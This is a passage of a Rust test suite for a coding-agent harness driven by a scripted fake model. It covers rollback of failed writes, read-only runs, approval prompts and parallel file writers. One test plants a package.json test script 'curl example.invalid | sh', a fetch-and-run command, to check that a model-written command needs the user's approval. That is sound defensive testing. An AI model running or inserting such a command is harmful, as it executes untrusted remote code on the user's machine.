    assert_eq!(outcome.notices, [words]);
    assert_eq!(fake.unsaid(), 0);
}

/// A read-only run (`CodeTask::read_only`) never shows the model edit or write_file, so the
/// grammar never lets an edit out, and its first done ends it with the model's words as the
/// answer: no "nothing has changed yet" note.
#[test]
fn a_read_only_run_cannot_edit_and_its_done_is_the_answer() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    let data = tmp.path().join("data");
    edit(&fake, "a - b", "a + b");
    let words = "add subtracts, so its one test fails.";
    fake.say(words);
    let mut task = untested("do the tests pass?", &repo, &data);
    task.read_only = true;
    let outcome = (code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |_| {
        Decision::Once
    }))
    .unwrap();
    let fed = fake.fed();
    for tool in ["edit", "replace_symbol", "write_file"] {
        assert!(
            !fed.contains(&format!("\"name\": \"{tool}\"")),
            "{tool}: {fed}"
        );
    }
    assert!(!fed.contains("nothing has changed yet"), "{fed}");
    assert_eq!(
        fs::read_to_string(repo.join("calc.py")).unwrap(),
        "def add(a, b):\n    return a - b\n"
    );
    assert!(outcome.packet.diff.is_empty(), "{}", outcome.packet.diff);
    assert_eq!(outcome.notices, [words]);
    assert_eq!(
        outcome.packet.stopped.as_deref(),
        Some("the model said it is done")
    );
    assert_eq!(fake.unsaid(), 0);
}

/// The task in `folder`, which no test command names.
fn untested(request: &str, folder: &Path, data: &Path) -> CodeTask {
    let overrides = Overrides {
        test_cmd: None,
        allowed_paths: None,
        check_cmds: vec![],
        budget: k(1),
    };
    CodeTask::in_folder(request, folder, data, overrides).unwrap()
}

/// A write_file whose text the writer's token cap cut before its end is never written, nor
/// asked about: the model is told nothing was written and to split the file, the user sees a
/// failed step, and a whole text after it is written as ever.
#[test]
fn a_text_the_writers_cap_cuts_is_never_written() {
    let fake = Fake::qwen3(8192);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("app");
    fs::create_dir(&folder).unwrap();
    no_plan(&fake);
    let data = tmp.path().join("data");
    let write = |path: &str| json!({"path": path, "about": "the app"});
    call(&fake, "write_file", write("web/big.py"), false);
    // The writer's whole cap, BODY_TOKENS at 8k (`Room::writer`), and no end of turn: the cap
    // ends it.
    fake.say_tokens(&vec![fake.byte(b'x'); 4096]);
    call(&fake, "write_file", write("app.py"), false);
    fake.say("```python\nprint(1)\n```");
    fake.say("Done.");
    fake.say("Done.");
    let task = untested("write the app", &folder, &data);
    let (mut asked, mut failed) = (Vec::new(), Vec::new());
    let sink = &mut |event| {
        if let AgentEvent::ToolResult { name, summary } = event
            && name == "write_file"
            && summary.starts_with("failed: ")
        {
            failed.push(summary);
        }
    };
    (code().run_with(&fake.larch, &task, &data, sink, &mut |ask| {
        asked.push(ask.path.clone());
        Decision::Once
    }))
    .unwrap();
    let asked: Vec<_> = asked.into_iter().flatten().collect();
    assert_eq!(asked, ["app.py"]);
    assert!(!folder.join("web").exists());
    assert_eq!(
        fs::read_to_string(folder.join("app.py")).unwrap(),
        "print(1)\n"
    );
    let cut = "nothing was written: the text for 'web/big.py' ran past the 4096 tokens";
    assert!(fake.fed().contains(cut), "{}", fake.fed());
    assert_eq!(failed.len(), 1, "{failed:?}");
    assert!(
        failed[0].starts_with(&format!("failed: {cut}")),
        "{failed:?}"
    );
}

/// A whole write is checked as an edit is: a text that fails its file's check is rolled back, a
/// file that passed it to what it held and a new one gone with the folders made for it, and the
/// model gets the checker's words; a text that passes is written.
#[test]
fn a_whole_write_that_fails_its_files_check_is_rolled_back() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("app");
    fs::create_dir(&folder).unwrap();
    let conf = "{\"port\": 8080}\n";
    fs::write(folder.join("conf.json"), conf).unwrap();
    let data = tmp.path().join("data");
    let write = |path: &str| json!({"path": path, "about": "the settings"});
    // JSON's check is serde's, so it runs the same on every host.
    call(&fake, "write_file", write("conf.json"), false);
    fake.say("{\"port\": 8080,");
    call(&fake, "write_file", write("data/new/list.json"), false);
    fake.say("[1, 2");
    call(&fake, "write_file", write("data/ok.json"), false);
    fake.say("[1, 2]");
    fake.say("Done.");
    fake.say("Done.");
    let task = untested("set the port", &folder, &data);
    (code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |_| {
        Decision::Once
    }))
    .unwrap();
    assert_eq!(fs::read_to_string(folder.join("conf.json")).unwrap(), conf);
    assert!(!folder.join("data/new").exists());
    assert_eq!(
        fs::read_to_string(folder.join("data/ok.json")).unwrap(),
        "[1, 2]\n"
    );
    let fed = fake.fed();
    for said in [
        "conf.json' fail its check:\nEOF while parsing",
        "list.json' fail its check:\nEOF while parsing",
    ] {
        assert!(fed.contains(said), "{said}: {fed}");
    }
    assert!(fed.contains("the write was rolled back"), "{fed}");
}

/// An attempt in a worktree asks no one, and its whole writes are still held to the checks an
/// ask runs first: a fragment of a page is refused there too, and the packet never carries it.
#[test]
fn a_worktrees_whole_write_never_cuts_a_file_to_a_fragment() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    let page = format!("<body>{}</body>\n", "p".repeat(400));
    fs::write(repo.join("index.html"), &page).unwrap();
    git(&repo, &["add", "."]);
    git(&repo, &["commit", "-q", "-m", "page"]);
    let write = json!({"path": "index.html", "about": "the page with a menu"});
    call(&fake, "write_file", write, false);
    fake.say("<header>Menu</header>");
    edit(&fake, "a - b", "a + b");
    fake.say("Done.");
    let data = tmp.path().join("data");
    let Some(mut outcome) = ran(code().run(&fake.larch, &task(&repo, k(1)), &data)) else {
        return;
    };
    assert!(fake.fed().contains("deleting most of it"), "{}", fake.fed());
    let p = &outcome.packet;
    let done = "the model said it is done and the tests agree";
    assert_eq!(p.stopped.as_deref(), Some(done), "{}", p.render());
    assert!(!p.diff.contains("index.html"), "{}", p.diff);
    outcome.task.discard().unwrap();
}

/// A page the model leaves broken holds done back only so long: after the third review, done
/// ends the run, and its packet names what is still broken instead of the budget running out.
#[test]
fn a_page_left_broken_ends_the_run_after_three_reviews() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("site");
    fs::create_dir(&folder).unwrap();
    no_plan(&fake);
    let data = tmp.path().join("data");
    let page =
        |n: u32| format!("<html><body><link href=\"missing.css\"><h1>Cafe {n}</h1></body></html>");
    // Each brief its own: the same call again in the folder it left would not run.
    let write =
        |n: u32| json!({"path": "index.html", "about": format!("the cafe's page, take {n}")});
    call(&fake, "write_file", write(0), false);
    fake.say(&page(0));
    // Each review holds the next reply to a call: a rewrite that leaves the link broken.
    for n in 1..=3 {
        fake.say("Done.");
        call(&fake, "write_file", write(n), false);
        fake.say(&page(n));
    }
    fake.say("Done.");
    // The reviewer reads the last done, which no review holds back any more.
    fake.say("ok");
    let overrides = Overrides {
        test_cmd: None,
        allowed_paths: None,
        check_cmds: vec![],
        budget: k(1),
    };
    let task = CodeTask::in_folder("make a cafe page", &folder, &data, overrides).unwrap();
    let outcome = (code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |_| {
        Decision::Once
    }))
    .unwrap();
    let stopped = outcome.packet.stopped.clone().unwrap_or_default();
    assert!(
        stopped.starts_with("the model said it is done; the folder has no tests"),
        "{stopped}"
    );
    assert!(
        stopped.contains("a page is still broken: index.html links missing.css"),
        "{stopped}"
    );
    assert_eq!(fake.unsaid(), 0, "{}", fake.fed());
    assert_eq!(
        fs::read_to_string(folder.join("index.html")).unwrap(),
        page(3) + "\n"
    );
}

/// The whole-page check reads .htm pages and an upper-case <BODY> as it reads index.html.
#[test]
fn a_whole_write_never_cuts_an_htm_page_to_a_fragment() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("site");
    fs::create_dir(&folder).unwrap();
    let page = format!("<HTML><BODY>{}</BODY></HTML>\n", "p".repeat(40));
    fs::write(folder.join("menu.HTM"), &page).unwrap();
    let data = tmp.path().join("data");
    call(
        &fake,
        "write_file",
        json!({"path": "menu.HTM", "about": "the menu with prices"}),
        false,
    );
    fake.say(&format!("<h1>Menu</h1>{}", "q".repeat(40)));
    fake.say("Done.");
    fake.say("Done.");
    let overrides = Overrides {
        test_cmd: None,
        allowed_paths: None,
        check_cmds: vec![],
        budget: k(1),
    };
    let task = CodeTask::in_folder("add prices", &folder, &data, overrides).unwrap();
    (code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |_| {
        Decision::Once
    }))
    .unwrap();
    assert!(fake.fed().contains("a fragment of one"), "{}", fake.fed());
    assert_eq!(fs::read_to_string(folder.join("menu.HTM")).unwrap(), page);
}

/// Attempts side by side need tests to pick one, so without a test command they never start.
#[test]
fn attempts_side_by_side_without_tests_are_refused() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    let overrides = Overrides {
        test_cmd: None,
        allowed_paths: None,
        check_cmds: vec![],
        budget: k(2),
    };
    let task = CodeTask::new("make add add", &repo, overrides).unwrap();
    let e = code().run(&fake.larch, &task, tmp.path()).unwrap_err();
    assert!(e.to_string().ends_with("name the test command"), "{e}");
    assert!(!tmp.path().join("agent/code").exists());
}

/// In place with nothing allowed and no one to ask (`Code::run`), no write runs.
#[test]
fn in_place_without_an_answer_writes_nothing() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    let data = tmp.path().join("data");
    edit(&fake, "a - b", "a + b");
    fake.say("Done.");
    let overrides = Overrides {
        test_cmd: Some(TEST.into()),
        allowed_paths: None,
        check_cmds: vec![],
        budget: Budget {
            tool_calls: 1,
            ..k(1)
        },
    };
    let task = CodeTask::in_folder("make add add", &repo, &data, overrides).unwrap();
    let Some(outcome) = ran(code().run(&fake.larch, &task, &data)) else {
        return;
    };
    let calc = fs::read_to_string(repo.join("calc.py")).unwrap();
    assert_eq!(calc, "def add(a, b):\n    return a - b\n");
    assert_eq!(outcome.packet.diff, "");
}

/// The writer sees what the planner read: a file it viewed is in the write_file's brief whole.
#[test]
fn a_brief_holds_a_file_the_planner_viewed() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("geo");
    fs::create_dir(&folder).unwrap();
    let geo = "def distance(a, b):\n    return abs(a - b)\n";
    fs::write(folder.join("geo.py"), geo).unwrap();
    let data = tmp.path().join("data");
    call(&fake, "view", json!({"path": "geo.py"}), false);
    let write = json!({"path": "route.py", "about": "route_length(points) summing distances"});
    call(&fake, "write_file", write, false);
    fake.say("ROUTE = 1\n");
    fake.say("Done.");
    fake.say("Done.");
    let task = untested("add route_length to route.py", &folder, &data);
    (code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |_| {
        Decision::Once
    }))
    .unwrap();
    let fed = fake.fed();
    assert!(fed.contains(&format!("geo.py:\n{geo}")), "{fed}");
}

/// A viewed file bigger than the brief's room is left out whole, never cut, and the target's
/// and the written files' texts are still there.
#[test]
fn a_viewed_file_too_big_for_the_brief_is_left_out_whole() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("app");
    fs::create_dir(&folder).unwrap();
    // Past the 32 KB brief a 32k context gives (`Room::brief_bytes`).
    fs::write(folder.join("big.py"), "BIG = 1\n".repeat(5000)).unwrap();
    fs::write(folder.join("route.py"), "R = 0\n").unwrap();
    let data = tmp.path().join("data");
    let write = |path: &str| json!({"path": path, "about": "a constant"});
    call(&fake, "write_file", write("a.py"), false);
    fake.say("A = 1\n");
    call(&fake, "view", json!({"path": "big.py"}), false);
    call(&fake, "write_file", write("route.py"), false);
    fake.say("R = 1\n");
    fake.say("Done.");
    fake.say("Done.");
    let task = untested("set the constants", &folder, &data);
    (code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |_| {
        Decision::Once
    }))
    .unwrap();
    let fed = fake.fed();
    assert!(!fed.contains("big.py:\n"), "{fed}");
    assert!(fed.contains("route.py as it is now:\nR = 0\n"), "{fed}");
    assert!(fed.contains("a.py:\nA = 1\n"), "{fed}");
    assert_eq!(
        fs::read_to_string(folder.join("route.py")).unwrap(),
        "R = 1\n"
    );
}

/// A whole write is held to the syntax check an edit is: a Python text with an unclosed bracket
/// is refused with the checker's words, and the file keeps what it held.
#[test]
fn a_write_file_that_breaks_the_syntax_check_is_refused() {
    // Windows CI has no Python, so no checker runs there; a missing one anywhere else fails.
    if cfg!(windows)
        && !(std::process::Command::new("python")
            .arg("--version")
            .output())
        .is_ok_and(|o| o.status.success())
    {
        println!("python is not on PATH: the Python syntax check is not run");
        return;
    }
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("app");
    fs::create_dir(&folder).unwrap();
    let app = "X = 1\n";
    fs::write(folder.join("app.py"), app).unwrap();
    let data = tmp.path().join("data");
    let write = json!({"path": "app.py", "about": "X as a list"});
    call(&fake, "write_file", write, false);
    fake.say("X = [1, 2\n");
    fake.say("Done.");
    fake.say("Done.");
    let task = untested("make X a list", &folder, &data);
    (code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |_| {
        Decision::Once
    }))
    .unwrap();
    let fed = fake.fed();
    assert!(fed.contains("app.py' fail its check:\n"), "{fed}");
    assert!(fed.contains("the write was rolled back"), "{fed}");
    assert!(fed.contains("SyntaxError"), "{fed}");
    assert_eq!(fs::read_to_string(folder.join("app.py")).unwrap(), app);
}

/// An untested folder that gains a package.json with a test script mid-run is tested from then
/// on: the tests run on the tree as it is then, run_tests is offered and the model told, and the
/// next done runs the tests, which hold the run until they pass.
#[test]
fn a_manifest_written_mid_run_makes_the_task_tested() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("app");
    fs::create_dir(&folder).unwrap();
    no_plan(&fake);
    let data = tmp.path().join("data");
    let write = |path: &str, about: &str| json!({"path": path, "about": about});
    call(
        &fake,
        "write_file",
        write("package.json", "the manifest"),
        false,
    );
    fake.say("{\"scripts\": {\"test\": \"node test.js\"}}");
    fake.say("Done.");
    call(&fake, "write_file", write("test.js", "the test"), false);
    fake.say("console.log(\"ok\");");
    fake.say("Done.");
    let task = untested("make an app", &folder, &data);
    let got = code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |_| {
        Decision::Once
    });
    let Some(outcome) = ran(got) else {
        return;
    };
    // Tests that cannot run are the model's to hear, as a step's error is, not the run's end:
    // without npm on this machine, or without the sandbox.
    if outcome.task.test_cmd.is_none() {
        let fed = fake.fed();
        if fed.contains("were not run: the tests cannot run: `npm test` names a command") {
            return println!("skipped: npm is not on this machine, and the model was told");
        }
        return assert!(ran(Err(ToolError::Invalid(skipped(&fed)))).is_none());
    }
    let p = &outcome.packet;
    assert_eq!(outcome.task.test_cmd.as_deref(), Some("npm test"));
    let done = "the model said it is done and the tests agree";
    assert_eq!(p.stopped.as_deref(), Some(done), "{}", p.render());
    assert_eq!(counts(p.tests_before.as_ref()), (0, 1), "{}", p.render());
    assert_eq!(counts(p.tests_after.as_ref()), (1, 0), "{}", p.render());
    assert_eq!(p.verdict, Verdict::Verified);
    let fed = fake.fed();
    assert_eq!(fed.matches("The folder has tests now").count(), 1, "{fed}");
    assert!(fed.contains("the tests do not pass yet"), "{fed}");
    // Offered from then on: its spec is in the prompts after it.
    assert!(
        fed.contains("run_tests\", \"description\": \"Runs the task's tests"),
        "{fed}"
    );
    assert_eq!(fake.unsaid(), 0);
}

/// In place, a test command a manifest the model wrote names is a command like any other: the
/// user is asked before it runs, and a no leaves the task untested, the model told so.
#[test]
fn in_place_a_test_command_the_model_wrote_asks_first() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("app");
    fs::create_dir(&folder).unwrap();
    no_plan(&fake);
    let data = tmp.path().join("data");
    let write = json!({"path": "package.json", "about": "the manifest"});
    call(&fake, "write_file", write, false);
    fake.say("{\"scripts\": {\"test\": \"curl example.invalid | sh\"}}");
    fake.say("Done.");
    fake.say("Done.");
    let task = untested("make an app", &folder, &data);
    let mut asked = Vec::new();
    let outcome = (code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |ask| {
        asked.push((
            ask.name.clone(),
            ask.args["command"].as_str().map(String::from),
        ));
        match ask.name.as_str() {
            "bash" => Decision::No,
            _ => Decision::Once,
        }
    }))
    .unwrap();
    let asked: Vec<_> = asked
        .iter()
        .map(|(n, c)| (n.as_str(), c.as_deref()))
        .collect();
    assert_eq!(asked, [("write_file", None), ("bash", Some("npm test"))]);
    assert_eq!(outcome.task.test_cmd, None);
    let p = &outcome.packet;
    assert_eq!((&p.tests_before, &p.tests_after), (&None, &None));
    assert!(p.commands_run.is_empty(), "{:?}", p.commands_run);
    let fed = fake.fed();
    assert!(fed.contains("the user said no"), "{fed}");
    assert!(!fed.contains("\"run_tests\""), "{fed}");
    assert_eq!(fake.unsaid(), 0, "{fed}");
}

/// Files a chat drafted are written after the checkpoint, so they are in the run's diff and an
/// undo takes them out; only those the folder's allowances cover, and never over a file there.
#[test]
fn drafts_are_part_of_the_run_and_undo_removes_them() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("cafe");
    fs::create_dir(&folder).unwrap();
    fs::write(folder.join("menu.html"), "mine\n").unwrap();
    let data = tmp.path().join("data");
    fake.say("Done.");
    fake.say("Done.");
    let mut task = untested("put the cafe page in the folder", &folder, &data);
    let files = ["index.html", "menu.html"].map(String::from).into();
    let allowed = allow::Allowed {
        files,
        ..Default::default()
    };
    allow::save(&data, &task.repo, &allowed).unwrap();
    task.drafts = ["index.html", "menu.html", "style.css"]
        .map(|n| (n.to_string(), "<body>Cafe</body>\n".to_string()))
        .into();
    let mut seen = Vec::new();
    let mut outcome = (code().run_with(
        &fake.larch,
        &task,
        &data,
        &mut |e| seen.push(e),
        &mut |_| Decision::No,
    ))
    .unwrap();
    let read = |name| fs::read_to_string(folder.join(name)).ok();
    assert_eq!(read("index.html").as_deref(), Some("<body>Cafe</body>\n"));
    assert_eq!(read("menu.html").as_deref(), Some("mine\n"));
    assert_eq!(read("style.css"), None);
    let text = "started from the code drafted in this chat: index.html";
    assert!(seen.contains(&AgentEvent::Notice(text.into())), "{seen:?}");
    let p = &outcome.packet;
    assert!(p.diff.contains("+<body>Cafe</body>"), "{}", p.diff);
    let mut out = Vec::new();
    assert!(!decide(&mut outcome, &mut "y\n".as_bytes(), &mut out).unwrap());
    assert_eq!(read("index.html"), None);
    assert_eq!(read("menu.html").as_deref(), Some("mine\n"));
}

/// A done the tests call fixed while one that failed before still fails is sent back once
/// naming it; the second ends the attempt, never as a pass, and says which.
#[test]
fn a_done_with_failures_left_is_never_a_pass() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let repo = toy(tmp.path());
    fs::write(
        repo.join("test_calc.py"),
        "import unittest\nfrom calc import add\n\nclass T(unittest.TestCase):\n    \
         def test_add(self):\n        self.assertEqual(add(2, 3), 5)\n\n    \
         def test_left(self):\n        self.assertEqual(add(2, 3), 6)\n\nunittest.main()\n",
    )
    .unwrap();
    git(&repo, &["commit", "-q", "-am", "two tests"]);
    edit(&fake, "a - b", "a + b");
    fake.say("Done.");
    fake.say("Done.");
    let data = tmp.path().join("data");
    let Some(outcome) = ran(code().run(&fake.larch, &task(&repo, k(1)), &data)) else {
        return;
    };
    let fed = fake.fed();
    assert!(
        fed.contains("still failing, as before your change: test_left"),
        "{fed}"
    );
    let p = &outcome.packet;
    let Verdict::AsBefore(left) = &p.verdict else {
        panic!("{:?}", p.verdict)
    };
    assert!(
        left.len() == 1 && left[0].starts_with("test_left"),
        "{left:?}"
    );
    let except = "verdict: passes except 1 failures that were there before the change";
    assert!(p.render().contains(except), "{}", p.render());
    assert_eq!(fake.unsaid(), 0, "{fed}");
}

/// A page broken at the first done, whose second done ends the run with a review finding still
/// left, is partial: the packet names what is left instead of reading as done.
#[test]
fn a_second_done_over_a_broken_page_is_partial_not_done() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("site");
    fs::create_dir(&folder).unwrap();
    no_plan(&fake);
    let data = tmp.path().join("data");
    let write = |path: &str, about: &str| json!({"path": path, "about": about});
    call(&fake, "write_file", write("index.html", "the page"), false);
    fake.say("<html><body><link href=\"style.css\"><h1 class=\"title\">Cafe</h1></body></html>");
    fake.say("Done.");
    call(&fake, "write_file", write("style.css", "the look"), false);
    fake.say("h1 { color: red; }");
    fake.say("Done.");
    // The reviewer reads the done no broken page holds back.
    fake.say("ok");
    let task = untested("make a cafe web page", &folder, &data);
    let outcome = (code().run_with(&fake.larch, &task, &data, &mut |_| {}, &mut |_| {
        Decision::Once
    }))
    .unwrap();
    let p = &outcome.packet;
    let done = "the model said it is done; the folder has no tests";
    assert_eq!(p.stopped.as_deref(), Some(done), "{}", p.render());
    let Verdict::Partial(left) = &p.verdict else {
        panic!("{:?}", p.verdict)
    };
    assert!(
        left.contains(&"index.html uses the classes title, which no stylesheet styles".into()),
        "{left:?}"
    );
    assert_eq!(fake.unsaid(), 0, "{}", fake.fed());
}

/// What only the web guidance says, to the planner and to the writer of a web file.
const RECIPE: &str = "every section the request implies";

/// Runs `request` untested in `folder` with one write_file of `path` and a done.
fn write_once(fake: &Fake, request: &str, folder: &Path, data: &Path, path: &str) -> Outcome {
    let write = json!({"path": path, "about": "what the request asks"});
    call(fake, "write_file", write, false);
    fake.say("x\n");
    fake.say("Done.");
    fake.say("Done.");
    let task = untested(request, folder, data);
    (code().run_with(&fake.larch, &task, data, &mut |_| {}, &mut |_| {
        Decision::Once
    }))
    .unwrap()
}

/// A task that is no website gets no web guidance, in the planner's prompt or the writer's. No
/// manifest, so no tests to run, which the sandbox would need.
#[test]
fn the_web_recipe_is_not_in_a_rust_task_prompt() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("stack");
    fs::create_dir_all(folder.join("src")).unwrap();
    fs::write(
        folder.join("src/lib.rs"),
        "pub fn one() -> u32 {\n    1\n}\n",
    )
    .unwrap();
    let data = tmp.path().join("data");
    let request = "add a Stack<T> with push and pop in src/lib.rs";
    write_once(&fake, request, &folder, &data, "src/lib.rs");
    let fed = fake.fed();
    assert!(fed.contains("Write src/lib.rs whole"), "{fed}");
    assert!(!fed.contains(RECIPE), "{fed}");
    assert!(!fed.contains("[phone]"), "{fed}");
}

/// A site that has its pages keeps its own design: a change to it gets no web recipe.
#[test]
fn a_brief_for_an_existing_site_has_no_recipe() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("site");
    fs::create_dir(&folder).unwrap();
    let page = "<html><head><link rel=\"stylesheet\" href=\"style.css\"></head>\
                <body><header class=\"top\">Cafe</header></body></html>\n";
    fs::write(folder.join("index.html"), page).unwrap();
    fs::write(folder.join("style.css"), ".top { color: red; }\n").unwrap();
    let data = tmp.path().join("data");
    let outcome = write_once(
        &fake,
        "make the website's header blue",
        &folder,
        &data,
        "style.css",
    );
    let fed = fake.fed();
    assert!(fed.contains("Write style.css whole"), "{fed}");
    assert!(!fed.contains(RECIPE), "{fed}");
    assert!(!fed.contains("[phone]"), "{fed}");
    // Its media queries may live anywhere: a new site's stylesheet checks are not its own.
    assert!(!fed.contains("@media"), "{fed}");
    assert_eq!(outcome.packet.verdict, Verdict::Unverified);
}

/// A new website's writer is told to use the user's details and mark the missing ones, never
/// to invent them; the planner, to list them when it is done.
#[test]
fn a_new_websites_writer_marks_missing_details_instead_of_inventing_them() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("cafe");
    fs::create_dir(&folder).unwrap();
    no_plan(&fake);
    let data = tmp.path().join("data");
    let request = "make a one-page website for my cafe, Bean There";
    write_once(&fake, request, &folder, &data, "index.html");
    let fed = fake.fed();
    let brief = &fed[fed.find("Request: make a one-page").unwrap()..];
    let brief = &brief[brief.find("The project's files").unwrap()..];
    let brief = &brief[..brief
        .find("Reply with only the text of index.html")
        .unwrap()];
    for said in [
        RECIPE,
        "Use the business details the user gave; where a detail is missing, write a clearly \
         marked placeholder (such as [phone]), never invent one",
    ] {
        assert!(brief.contains(said), "{said}: {fed}");
    }
    let planner = "use the business details the user gave; where a detail is missing, write a \
                   clearly marked placeholder (such as [phone]) and list them in your done line, \
                   never invent one";
    assert!(fed.contains(planner), "{fed}");
}

/// Scripts one reply of several Qwen3 calls, each closed, then the end of turn.
fn calls(fake: &Fake, calls: &[(&str, Value)]) {
    let mut ids = Vec::new();
    for (tool, args) in calls {
        ids.push(fake.token("<tool_call>"));
        let body = format!("\n{{\"name\": \"{tool}\", \"arguments\": {args}}}\n");
        ids.extend(fake.tokenizer.encode(&body, false));
        ids.push(fake.token("</tool_call>"));
        ids.extend(fake.tokenizer.encode("\n", false));
    }
    ids.push(fake.tokenizer.eos().unwrap());
    fake.say_tokens(&ids);
}

/// `code` with room for writers side by side: `Workers::at_once` is 3.
fn wide() -> Code {
    Code {
        workers: Workers {
            max_workers: 4,
            prefix_cache: false,
        },
        ..code()
    }
}

/// A write_file call of `path` with `about`, for `calls`.
fn write(path: &str, about: &str) -> (&'static str, Value) {
    ("write_file", json!({"path": path, "about": about}))
}

/// Runs `request` untested in `folder` on `wide`, saying yes to each ask: the paths asked about,
/// and the notices.
fn run_wide(fake: &Fake, request: &str, folder: &Path, data: &Path) -> (Vec<String>, String) {
    let task = untested(request, folder, data);
    let (mut asked, mut notices) = (Vec::new(), String::new());
    let sink = &mut |event| {
        if let AgentEvent::Notice(n) = event {
            // The writers' requests go in one after another: the first one's first pass holds
            // until the others are in, so none runs ahead alone, as a loaded host can make it.
            if n.contains(" at once") {
                fake.stall(Duration::from_secs(1));
            }
            notices += &n;
        }
    };
    (wide().run_with(&fake.larch, &task, data, sink, &mut |ask| {
        asked.push(ask.path.clone());
        Decision::Once
    }))
    .unwrap();
    (asked.into_iter().flatten().collect(), notices)
}

/// One reply of write_file calls for files not there yet has them written side by side, each
/// writer told the others' abouts, each file asked about and shown as its own step.
#[test]
fn new_files_in_one_reply_are_written_side_by_side() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("notes");
    fs::create_dir(&folder).unwrap();
    no_plan(&fake);
    let data = tmp.path().join("data");
    calls(
        &fake,
        &[
            write("a.txt", "the alpha note"),
            write("b.txt", "the beta note"),
            write("c.txt", "the gamma note"),
        ],
    );
    // One script for the three writers: side by side each takes about a third of the x's; one
    // after another, the first would take them all and the others none.
    const X: usize = 12;
    let mut ids = vec![fake.byte(b'x'); 3 * X];
    ids.extend([fake.tokenizer.eos().unwrap(); 3]);
    fake.say_tokens(&ids);
    fake.say("Done.");
    fake.say("Done.");
    let (asked, notices) = run_wide(&fake, "write three notes", &folder, &data);
    assert_eq!(asked, ["a.txt", "b.txt", "c.txt"]);
    assert!(
        notices.contains("writing a.txt, b.txt, c.txt at once"),
        "{notices}"
    );
    for name in ["a.txt", "b.txt", "c.txt"] {
        let text = fs::read_to_string(folder.join(name)).unwrap();
        let x = text.trim_end();
        assert!(!x.is_empty() && x.len() < 3 * X, "{name}: {text:?}");
        assert!(x.chars().all(|c| c == 'x'), "{name}: {text:?}");
    }
    let fed = fake.fed();
    for sibling in [
        "a.txt: the alpha note",
        "b.txt: the beta note",
        "c.txt: the gamma note",
    ] {
        assert!(fed.contains(sibling), "{sibling}: {fed}");
    }
    for name in ["a.txt", "b.txt", "c.txt"] {
        let wrote = format!(" bytes to {name}\n");
        assert!(fed.contains(&wrote), "{name}: {fed}");
    }
    assert!(!fed.contains("the first call is used"), "{fed}");
}

/// A reply that mixes a write_file with another call still runs its first call alone.
#[test]
fn a_write_file_with_another_call_runs_the_first_alone() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("notes");
    fs::create_dir(&folder).unwrap();
    fs::write(folder.join("b.txt"), "beta\n").unwrap();
    let data = tmp.path().join("data");
    let edit = json!({"path": "b.txt", "old_text": "beta", "new_text": "gamma"});
    calls(&fake, &[write("a.txt", "the alpha note"), ("edit", edit)]);
    fake.say("alpha");
    fake.say("Done.");
    fake.say("Done.");
    let (asked, notices) = run_wide(&fake, "write a note and fix the other", &folder, &data);
    assert_eq!(asked, ["a.txt"]);
    assert!(!notices.contains("at once"), "{notices}");
    assert_eq!(fs::read_to_string(folder.join("a.txt")).unwrap(), "alpha\n");
    assert_eq!(fs::read_to_string(folder.join("b.txt")).unwrap(), "beta\n");
    assert!(
        fake.fed().contains("the first call is used"),
        "{}",
        fake.fed()
    );
}

/// write_file calls of which one names a file already there run the first alone: that file's
/// writer must see its text, which a write beside the others would not wait for.
#[test]
fn write_files_of_which_one_exists_run_the_first_alone() {
    let fake = Fake::qwen3(32768);
    let tmp = tempfile::tempdir().unwrap();
    let folder = tmp.path().join("notes");
    fs::create_dir(&folder).unwrap();
    fs::write(folder.join("b.txt"), "beta\n").unwrap();
    let data = tmp.path().join("data");
    calls(
        &fake,
        &[
            write("a.txt", "the alpha note"),
            write("b.txt", "the beta note"),
            write("c.txt", "the gamma note"),
        ],
    );
    fake.say("alpha");
    fake.say("Done.");
    fake.say("Done.");
    let (asked, notices) = run_wide(&fake, "write the notes", &folder, &data);
    assert_eq!(asked, ["a.txt"]);
    assert!(!notices.contains("at once"), "{notices}");
    assert_eq!(fs::read_to_string(folder.join("a.txt")).unwrap(), "alpha\n");
